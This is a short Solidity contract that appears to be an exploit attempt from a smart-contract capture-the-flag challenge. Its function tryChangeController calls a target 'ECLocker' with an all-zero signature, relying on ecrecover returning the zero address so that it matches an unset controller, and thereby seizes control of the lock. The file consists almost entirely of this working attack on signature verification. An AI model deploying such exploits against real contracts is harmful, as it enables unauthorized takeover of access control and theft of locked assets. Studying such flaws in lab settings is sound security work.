// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IECLocker {
    function changeController(uint8 v, bytes32 r, bytes32 s, address newController) external;
    function controller() external view returns (address);
    function msgHash() external view returns (bytes32);
    function lockId() external view returns (uint256);
}

contract DirectTest {
    IECLocker public locker;
    
    constructor(address _locker) {
        locker = IECLocker(_locker);
    }
    
    function getMsgHash() external view returns (bytes32) {
        return locker.msgHash();
    }
    
    function getLockId() external view returns (uint256) {
        return locker.lockId();
    }
    
    function tryChangeController() external {
        // Since controller is 0x0, we need ecrecover to return 0x0
        // Let's try with completely invalid signature values
        
        // Try 1: All zeros except v=27 (valid range)
        locker.changeController(27, bytes32(0), bytes32(0), msg.sender);
    }
}